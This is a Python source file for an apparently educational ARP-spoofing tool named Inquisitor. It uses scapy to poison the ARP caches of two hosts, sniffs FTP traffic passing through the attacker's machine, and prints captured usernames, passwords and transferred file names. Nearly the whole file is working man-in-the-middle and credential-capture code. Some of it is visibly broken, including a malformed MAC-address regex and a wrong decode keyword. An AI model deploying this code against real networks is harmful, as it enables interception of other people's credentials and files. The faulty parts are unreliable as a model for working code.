import argparse
import ipaddress
import re
import scapy.all as scapy
from scapy.layers.inet import TCP
from scapy.layers.l2 import ARP

Args = argparse.Namespace
Parser = argparse.ArgumentParser


class Color:
    HEADER = "\033[36m"
    INFO = "\033[96m"
    SUCCESS = "\033[92m"
    WARNING = "\033[93m"
    ERROR = "\033[91m"
    RESET = "\033[0m"


HEADER = """
@@@  @@@  @@@   @@@@@@    @@@  @@@  @@@   @@@@@@   @@@  @@@@@@@   @@@@@@   @@@@@@@   
@@@  @@@@ @@@  @@@@@@@@   @@@  @@@  @@@  @@@@@@@   @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@!@!@@@  @@!  @@@   @@!  @@@  @@!  !@@       @@!    @@!    @@!  @@@  @@!  @@@  
!@!  !@!!@!@!  !@!  @!@   !@!  @!@  !@!  !@!       !@!    !@!    !@!  @!@  !@!  @!@  
!!@  @!@ !!@!  @!@  !@!   @!@  !@!  !!@  !!@@!!    !!@    @!!    @!@  !@!  @!@!!@!   
!!!  !@!  !!!  !@!  !!!   !@!  !!!  !!!   !!@!!!   !!!    !!!    !@!  !!!  !!@!@!    
!!:  !!:  !!!  !!:!!:!:   !!:  !!!  !!:       !:!  !!:    !!:    !!:  !!!  !!: :!!   
:!:  :!:  !:!  :!: :!:    :!:  !:!  :!:      !:!   :!:    :!:    :!:  !:!  :!:  !:!  
 ::   ::   ::  ::::: :!   ::::: ::   ::  :::: ::    ::     ::    ::::: ::  ::   :::  
:    ::    :    : :  :::   : :  :   :    :: : :    :       :      : :  :    :   : :  
                                                                                     
"""


def print_header() -> None:
    for line in HEADER.splitlines():
        print(Color.HEADER + "{:^90}".format(line) + Color.RESET)


def parse_args() -> Args:
    parser: Parser = argparse.ArgumentParser(
        prog="Inquisitor", description="An ARP spoofing tool."
    )
    parser.add_argument("src_ip", help="Source IP address")
    parser.add_argument("src_mac", help="Source MAC address")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_mac", help="Target MAC address")
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose mode"
    )
    return parser.parse_args()


class Inquisitor:
    def __init__(self, s_ip: str, s_mac: str, t_ip: str, t_mac: str, v: bool = False):
        self.src_ip = s_ip
        self.src_mac = s_mac
        self.target_ip = t_ip
        self.target_mac = t_mac
        self.verbose = v
        self.self_mac = ARP().hwsrc
        self.interface = "eth0"
        self.sniff_filter = "tcp port 21"

    def run(self) -> None:
        try:
            print(f"{Color.INFO}ARP Spoofing starting...{Color.RESET}")
            self.arp_spoof()
            scapy.sniff(
                iface=self.interface,
                prn=self._intercept_ftp_traffic,
                filter=self.sniff_filter,
            )
        except KeyboardInterrupt:
            print(
                f"{Color.WARNING}Inquisitor stopped by user. Restoring the network, please wait...{Color.RESET}"
            )
            self.arp_restore()
            print(f"{Color.SUCCESS}Network restored.{Color.RESET}")
            exit(0)

    def _intercept_ftp_traffic(self, packet) -> None:
        if packet.haslayer(TCP) and packet.haslayer(scapy.Raw):
            if packet[TCP].dport == 21 and not self.verbose:
                ftp_payload = packet[scapy.Raw].load.decode("utf-8", error="ignore")
                if "USER" in ftp_payload:
                    print(f"{Color.INFO}FTP User: ", ftp_payload.strip(), Color.RESET)
                elif "PASS" in ftp_payload:
                    print(
                        f"{Color.INFO}FTP Password: {ftp_payload.strip()}{Color.RESET}"
                    )
                elif "RETR" in ftp_payload:
                    filename = re.findall(r"RETR (.+)", ftp_payload)
                    if filename:
                        print(
                            f"{Color.INFO}File Downloaded: {filename[0].strip()}{Color.RESET}"
                        )
                elif "STOR" in ftp_payload:
                    filename = re.findall(r"STOR (.+)", ftp_payload)
                    if filename:
                        print(
                            f"{Color.INFO}File Uploaded: {filename[0].strip()}{Color.RESET}"
                        )
        elif self.verbose:
            print(f"{Color.INFO}Packet: {packet.show()}{Color.RESET}")

    def arp_spoof(self) -> None:
        arp_response = ARP(
            pdst=self.target_ip, hwdst=self.target_mac, psrc=self.src_ip, op="is-at"
        )
        scapy.send(arp_response, verbose=False, count=7)
        print(
            f"{Color.SUCCESS}Sent to {self.target_ip} : {self.target_mac} is-at {self.self_mac}{Color.RESET}"
        )
        arp_response = ARP(
            pdst=self.src_ip, hwdst=self.src_mac, psrc=self.target_ip, op="is-at"
        )
        scapy.send(arp_response, verbose=False, count=7)
        print(
            f"{Color.SUCCESS}Sent to {self.src_ip} : {self.src_mac} is-at {self.self_mac}{Color.RESET}"
        )

    def arp_restore(self) -> None:
        print(f"{Color.INFO}Restoring the target network...{Color.RESET}")
        arp_response = ARP(
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.src_ip,
            hwsrc=self.src_mac,
            op="is-at",
        )
        scapy.send(arp_response, verbose=False, count=7)
        print(f"{Color.INFO}Restoring the source network...{Color.RESET}")
        arp_response = ARP(
            pdst=self.src_ip,
            hwdst=self.src_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
            op="is-at",
        )
        scapy.send(arp_response, verbose=False, count=7)

    def __del__(self) -> None:
        self.arp_restore()


def is_valid_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def is_valid_mac(mac: str) -> bool:
    mac_pattern = re.compile(r"^([0-9A-F]{2}[:-]){5}([0-9A-F){2})$", re.IGNORECASE)
    return bool(mac_pattern.match(mac))


def validate_args(args: Args) -> None:
    if not is_valid_ip(args.src_ip):
        raise ValueError("Invalid source IP address.")
    if not is_valid_mac(args.src_mac):
        raise ValueError("Invalid source MAC address.")
    if not is_valid_ip(args.target_ip):
        raise ValueError("Invalid target IP address.")
    if not is_valid_mac(args.target_mac):
        raise ValueError("Invalid target MAC address.")
    if args.src_ip == args.target_ip:
        raise ValueError("Source and target IP addresses must be different.")
    if args.src_mac == args.target_mac:
        raise ValueError("Source and target MAC addresses must be different.")
    if not args.verbose:
        args.verbose = False


def main() -> None:
    try:
        print_header()
        args: Args = parse_args()
        validate_args(args)
        inquisitor = Inquisitor(
            args.src_ip, args.src_mac, args.target_ip, args.target_mac, args.verbose
        )
        inquisitor.run()
    except Exception as e:
        print(f"{Color.ERROR}Error: {e}")


if __name__ == "__main__":
    main()
